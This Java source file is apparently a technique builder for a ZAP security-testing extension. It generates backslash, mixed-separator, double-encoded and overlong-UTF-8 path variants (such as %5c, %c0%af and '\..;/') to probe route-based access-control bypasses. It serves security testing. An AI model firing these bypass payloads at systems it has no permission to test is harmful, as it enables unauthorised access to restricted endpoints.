package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

/**
 * Backslash / mixed-separator path normalization.
 *
 * Many reverse proxies and web servers (IIS, Windows stacks, and proxy layers that
 * normalize '\' to '/') treat backslashes as equivalent directory separators, while
 * the upstream application or an access-control middleware may not. This drives a
 * parser differential between the proxy (sees '/') and the origin (sees '\') that can
 * bypass route-based restrictions.
 */
public class BackslashPathTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "Backslash Path"; }
    @Override public int getOrder() { return 51; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        String[] segments = ctx.rawSegments;
        if (segments.length == 0) return;

        // Join all segments with '\' as the only separator: \foo\bar
        StringBuilder all = new StringBuilder();
        for (int i = 0; i < segments.length; i++) {
            if (i > 0) all.append("\\");
            all.append(segments[i]);
        }
        String allBS = "\\" + all;
        techs.add(new Technique("Backslash Path", "BSPath:LeadBS",
            "Backslash as directory separator (leading): " + allBS,
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, allBS); return c; }));

        // Leading slash, then backslash separators: /foo\bar
        String allBSLead = "/" + all;
        techs.add(new Technique("Backslash Path", "BSPath:SlashLead",
            "Forward slash then backslash separators: " + allBSLead,
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, allBSLead); return c; }));

        // For each separator boundary replace with a mixed/backslash form
        for (int i = 0; i < segments.length - 1; i++) {
            final int b = i;
            techs.add(new Technique("Backslash Path", "BSBoundary:" + i,
                "Replace '/' between segments [" + i + "] and [" + (i + 1) + "] with '\\'",
                base -> {
                    StringBuilder sb = new StringBuilder();
                    for (int s = 0; s < segments.length; s++) {
                        if (s > 0) sb.append(s == b ? "\\" : "/");
                        sb.append(segments[s]);
                    }
                    HttpMessage c = cloneMsg(base); setLiteralPath(c, sb.toString()); return c; }));
        }

        // Alternate forward/backslash separators
        StringBuilder alt = new StringBuilder();
        for (int i = 0; i < segments.length; i++) {
            if (i > 0) alt.append(i % 2 == 1 ? "\\" : "/");
            alt.append(segments[i]);
        }
        String altForm = "/" + alt;
        techs.add(new Technique("Backslash Path", "BSAlt",
            "Alternating forward/backslash separators: " + altForm,
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, altForm); return c; }));

        // Double backslashes between boundaries
        for (int i = 0; i < segments.length - 1; i++) {
            final int b = i;
            techs.add(new Technique("Backslash Path", "BSDouble:" + i,
                "Double backslash between segments [" + i + "] and [" + (i + 1) + "]",
                base -> {
                    StringBuilder sb = new StringBuilder();
                    for (int s = 0; s < segments.length; s++) {
                        if (s > 0) sb.append(s == b ? "\\\\" : "/");
                        sb.append(segments[s]);
                    }
                    HttpMessage c = cloneMsg(base); setLiteralPath(c, "/" + sb.toString()); return c; }));
        }

        // Trailing backslash on the last segment
        final String trailBS = ctx.baseClean.endsWith("/") ? ctx.baseClean : ctx.baseClean + "\\";
        techs.add(new Technique("Backslash Path", "BSTrailing",
            "Trailing backslash after last segment: " + trailBS,
            base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, trailBS); return c; }));

        // Encoded backslash replacing the final separator
        String[] encSeps = {"%5c", "%5C", "%255c", "%c0%af", "%u2216", "%e2%88%95"};
        for (String es : encSeps) {
            final String enc = es;
            techs.add(new Technique("Backslash Path", "BSEnc:" + enc,
                "Encoded backslash separator between last two segments: " + enc,
                base -> {
                    StringBuilder sb = new StringBuilder();
                    for (int s = 0; s < segments.length; s++) {
                        if (s > 0) sb.append(s == segments.length - 1 ? enc : "/");
                        sb.append(segments[s]);
                    }
                    HttpMessage c = cloneMsg(base); setLiteralPath(c, sb.toString()); return c; }));
        }

        // Backslash + traditional trailing slash / dot combos
        String[] bsSuffixes = {
            "\\", "\\/", "\\\\", "\\..", "\\..\\", "\\..;/", "\\.", "\\.\\"
        };
        for (String s : bsSuffixes) {
            final String suf = s;
            techs.add(new Technique("Backslash Path", "BSSuffix:" + trunc(suf.replace("\\","BS").replace("/","S").replace(".","D"), 12),
                "Backslash suffix after path: " + suf,
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, ctx.baseClean + suf); return c; }));
        }
    }
}
